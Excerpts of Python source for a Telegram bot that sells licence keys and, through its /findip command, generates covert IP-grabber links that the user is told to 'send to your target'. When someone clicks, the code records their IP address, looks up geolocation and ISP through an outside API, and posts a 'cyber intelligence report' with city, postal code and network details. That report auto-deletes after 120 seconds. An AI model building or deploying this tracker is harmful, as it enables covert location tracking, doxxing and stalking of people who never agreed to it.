...
def track_ip(token):
    """Handle IP tracking link clicks"""
    try:
        # Get tracking link data
        link_data = get_tracking_link(token)
        ...
        if datetime.utcnow() > expiry_time:
            return "❌ This tracking link has expired", 410
        ...
        # Mark as clicked
        mark_link_clicked(token)
        
        # Fetch IP data from Abbas API
        try:
            ip_response = requests.get(IP_API + client_ip, timeout=10).json()
            
            if ip_response.get("success") and ip_response.get("data"):
                ip_data = ip_response["data"]
                
                # Send cyber report to generator
                threading.Thread(
                    target=send_cyber_report,
                    args=(link_data, ip_data, client_ip),
                    daemon=True
                ).start()
...
GROUP_LIMIT_MESSAGE = (
    ...
    "📊 <b>Group Members</b>\n"
    "👥 <b>Current:</b> {current_members}\n"
    "🎯 <b>Required:</b> {required_members}\n"
    "➕ <b>Needed:</b> {need_members}\n\n"

    "🧩 <b>To unlock:</b>\n"
    "• Share the link\n"
    "• Add new members\n\n"

    "🔗 <a href=\"https://t.me/+caHRhuChqx41ODg1\"><b>Target Group Link</b></a>\n\n"

    "⚡ <b>Access starts automatically</b> "
    "after target is completed."
)
...
WELCOME_MESSAGE = (
    ...
    "ғɪɴᴅɪᴘ: <code>/findip</code> <code>auto cyber report</code>\n"
...
COMMAND_ORDER = [
    ...
    ("ip", "ɪᴘ: /ip 8.8.8.8"),
    ("findip", "ғɪɴᴅɪᴘ: /findip (auto cyber report  )"),
...
HELP_MAP = {
    ...
    "/ip": "💡 Usage: /ip 8.8.8.8",
    "/findip": "💡 Usage: /findip (Send Link To Anyone)",
...
def activate_licence(user_id, chat_id, key):
    ...
    user_key = f"{user_id}_{chat_id}"
    used_keys = load_used_keys()
    key_data = used_keys.get(key, {})

    duration_code = key_data.get("duration")

    if duration_code == "genkey_1d":
        expiry = datetime.now() + timedelta(days=1)
    elif duration_code == "genkey_7d":
        expiry = datetime.now() + timedelta(days=7)
    elif duration_code == "genkey_1m":
        expiry = datetime.now() + timedelta(days=30)
    elif duration_code == "genkey_1y":
        expiry = datetime.now() + timedelta(days=365)
    elif duration_code == "genkey_life":
...
def send_cyber_report(link_data, ip_data, client_ip):
    """Send cyber report to the group/chat where the tracking link was generated"""
    try:
        user_id = link_data["user_id"]
        username = link_data.get("username", "Unknown")
        request_no = link_data["request_no"]
        chat_id = link_data.get("chat_id", user_id)  # Fallback to user_id if chat_id not saved
        message_id = link_data.get("message_id", None)  # Message to reply to
        ...
        timezone_offset = ip_data.get("Timezone_Offset", "N/A")
        ip_type = ip_data.get("Type", "N/A")
        
        # Format username mention
        user_mention = f"@{username}" if username and username != "Unknown" else f"User {user_id}"
        
        # Format cyber report
        report = (
            f"🎯 <b>CYBER INTELLIGENCE REPORT</b>\n\n"
            f"━━━━━━━━━━━━━━\n"
            f"👤 <b>GENERATOR INFO</b>\n"
            f"━━━━━━━━━━━━━━\n"
            f"🆔 User: {user_mention}\n"
            ...
            f"━━━━━━━━━━━━━━\n"
            f"🌐 IP Address: <code>{client_ip}</code>\n"
            f"{flag} Country: <b>{country}</b> ({country_code})\n"
            f"📍 Region: <b>{region}</b>\n"
            f"🏙️ City: <b>{city}</b>\n"
            f"📮 Postal: <code>{postal}</code>\n"
            f"🌍 Continent: <b>{continent}</b>\n\n"
            f"━━━━━━━━━━━━━━\n"
            f"🔗 <b>NETWORK DETAILS</b>\n"
            f"━━━━━━━━━━━━━━\n"
            f"🏢 ISP: <b>{isp}</b>\n"
            f"🏛️ Organization: <b>{org}</b>\n"
            ...
            f"🕐 Timezone: <b>{timezone}</b> ({timezone_offset})\n\n"
            f"━━━━━━━━━━━━━━\n"
            f"⏳ Message auto-delete in 120 seconds\n"
            f"⚡ Powered by @imvrct"
        )
        
        # Send report to the chat/group where command was used, reply to original message
        msg_id = send_message(chat_id, report, reply_to_message_id=message_id)
        
        # Auto-delete after 120 seconds
        if msg_id:
            threading.Thread(
                target=lambda: (time.sleep(120), delete_message(chat_id, msg_id)),
                daemon=True
            ).start()
            
    except Exception as e:
        print(f"Cyber Report Error: {e}")
        import traceback
        traceback.print_exc()
...
def handle_callback_query(callback):
    ...
    send_message(
        chat_id,
        f"""✅ Licence Key Generated

🔑 <code>{key}</code>
⏳ Duration: <b>{duration_map[data]}</b>
...
# ================= BOT LOGIC =================
def process_message(chat_id, text, user_id, message_id, username=None):
    ...
    # ===== GROUP SIZE LIMIT CHECK (ONLY FOR COMMANDS) =====
    if chat_id != user_id and raw.startswith("/"):
        members = get_chat_members_count(chat_id)
        if members < MIN_GROUP_MEMBERS:
            group_current_members = members

            text = GROUP_LIMIT_MESSAGE.format(
                current_members=group_current_members,
                required_members=MIN_GROUP_MEMBERS,
                need_members=max(0, MIN_GROUP_MEMBERS - group_current_members)
            )

            send_message(chat_id, text, reply_to_message_id=message_id)
            return
    # ===== END GROUP SIZE LIMIT =====
    ...
    if lower == "/genkey":
        ...
        keyboard = {
            "inline_keyboard": [
                [
                    {"text": "⏱ 1 Day", "callback_data": "genkey_1d"},
                {"text": "📆 7 Days", "callback_data": "genkey_7d"}
            ],
            [
                    {"text": "🗓 1 Month", "callback_data": "genkey_1m"},
                    {"text": "📅 1 Year", "callback_data": "genkey_1y"}
            ],
            [
                    {"text": "♾ Lifetime", "callback_data": "genkey_life"}
                ]
            ]
         }
...
🔑 Licence Activated
⏳ Validity: {get_remaining_time(expiry.isoformat())}
...
# ---------- /trace ----------
    ...
    # ---------- /findip ----------
    if lower == "/findip" or lower.startswith("/findip@"):
        try:
            # Get user info - use provided username or fetch from Telegram
            user_username = username if username else "Unknown"
            
            # Get global sequential request number (for all users)
            request_no = get_global_request_number()
            ...
            # Save tracking link to database with chat_id and message_id
            save_tracking_link(token, user_id, user_username, request_no, expiry_time, chat_id, message_id)
            
            # Get bot's domain from environment or use default
            bot_domain = os.getenv("RENDER_EXTERNAL_URL", "https://your-app.onrender.com")
            tracking_url = f"{bot_domain}/track/{token}"
            
            # Create response message
            link_message = (
                f"🎯 <b>IP TRACKING LINK GENERATED</b>\n\n"
                f"━━━━━━━━━━━━━━\n"
                f"👤 <b>GENERATOR INFO</b>\n"
                f"━━━━━━━━━━━━━━\n"
                f"🆔 User ID: <code>{user_id}</code>\n"
                f"👤 Username: @{user_username}\n"
                f"🧾 Request No: #{request_no}\n\n"
                f"━━━━━━━━━━━━━━\n"
                f"🔗 <b>TRACKING LINK</b>\n"
                f"━━━━━━━━━━━━━━\n"
                ...
                f"🗑️ This message will auto-delete in 60 seconds\n\n"
                f"⚡ Send this link to your target"
            )
            
            # Send the message
            msg_id = send_message(chat_id, link_message, reply_to_message_id=reply_to)
            ...
            print(f"FindIP Error: {e}")
            import traceback
            traceback.print_exc()  # This will print the full error traceback
            send_message(
                chat_id,
                "❌ Error generating tracking link. Please try again.",
                reply_to_message_id=reply_to
            )
            ...
            for u in upd.get("result", []):
                ...
                if "message" in u and "text" in u["message"]:
                    ...
                    if "from" in msg:
                        ...
                        process_message(chat_id, text, user_id, message_id, username)
                    else:
